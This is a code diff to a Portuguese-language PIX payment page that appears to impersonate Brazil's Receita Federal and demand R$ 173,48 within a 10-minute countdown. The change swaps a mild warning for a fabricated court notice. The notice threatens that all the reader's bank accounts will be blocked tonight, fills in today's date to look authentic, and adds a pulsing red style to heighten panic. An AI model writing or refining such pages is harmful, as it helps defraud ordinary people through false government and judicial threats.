@@ -492,12 +492,21 @@
 
         .warning-text {
             color: #721c24;
-            background-color: #f8d7da;
-            border: 1px solid #f5c6cb;
-            padding: 12px;
-            border-radius: 4px;
-            margin: 12px 0 0 0;
-            font-weight: 500;
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: white;
+            border: 2px solid #a71e2a;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-weight: 600;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(220, 53, 69, 0.3);
+            animation: urgentPulse 2s infinite;
+        }
+
+        @keyframes urgentPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
         }
 
         .countdown-timer-pix {
@@ -901,7 +910,9 @@
                     <p class="total-amount"><strong>Valor Total:</strong> R$ 173,48</p>
                 </div>
                 <p class="warning-text">
-                    Atenção! o código PIX para pagamento expira em 10 minutos. Regularize sua situação com a Receita Federal do Brasil Urgentemente!
+                    <strong>⚠️ AVISO URGENTE DO 5º TRIBUNAL DE JUSTIÇA ⚠️</strong><br><br>
+                    Foi determinado judicialmente que todas as contas bancárias de sua titularidade serão BLOQUEADAS às 23:59 de hoje (<span id="currentDate"></span>) caso os débitos de Imposto de Renda não sejam quitados. Após o bloqueio, você NÃO PODERÁ realizar transferências, PIX ou qualquer movimentação bancária.<br><br>
+                    <strong>EFETUE O PAGAMENTO IMEDIATAMENTE para evitar o bloqueio!</strong>
                 </p>
                 <div class="countdown-timer-pix" id="pixCountdown">10:00</div>
                 <img id="qrCodeImage" class="qr-code-img" src="" alt="QR Code PIX">
@@ -934,6 +945,20 @@
                 // Hide loading screen immediately for other pages
                 document.getElementById('loadingScreen').style.display = 'none';
                 document.getElementById('mainContent').classList.add('show');
+            }
+            
+            // Set current date in Brazilian format
+            const today = new Date();
+            const dateOptions = { 
+                day: '2-digit', 
+                month: '2-digit', 
+                year: 'numeric',
+                timeZone: 'America/Sao_Paulo'
+            };
+            const formattedDate = today.toLocaleDateString('pt-BR', dateOptions);
+            const currentDateElement = document.getElementById('currentDate');
+            if (currentDateElement) {
+                currentDateElement.textContent = formattedDate;
             }
         });
     </script>
